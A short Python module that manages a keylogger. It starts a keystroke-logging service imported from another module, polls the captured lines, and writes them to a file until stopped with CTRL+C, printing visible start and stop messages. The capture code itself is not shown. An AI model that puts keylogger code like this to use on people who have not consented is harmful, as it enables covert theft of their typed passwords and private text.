from keylogger_service import KeyloggerService
from file_writer import FileWriter
import time

class KeyloggerManger:
    def __init__(self):
        self.keylogger = KeyloggerService()
        self.writer = FileWriter()

    def start(self):
        print("🔴 Keylogger started. Press CTRL+C to stop.")
        self.keylogger.start_logging()
        try:
            while True:
                lines = self.keylogger.get_logged_lines()
                if lines:
                    for line in lines:
                        self.writer.write(line)
                    self.keylogger.logged_lines = []
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.keylogger.stop_logging()
            lines = self.keylogger.get_logged_lines()
            for line in lines:
                self.writer.write(line)
            print("🟢 Keylogger stopped.")
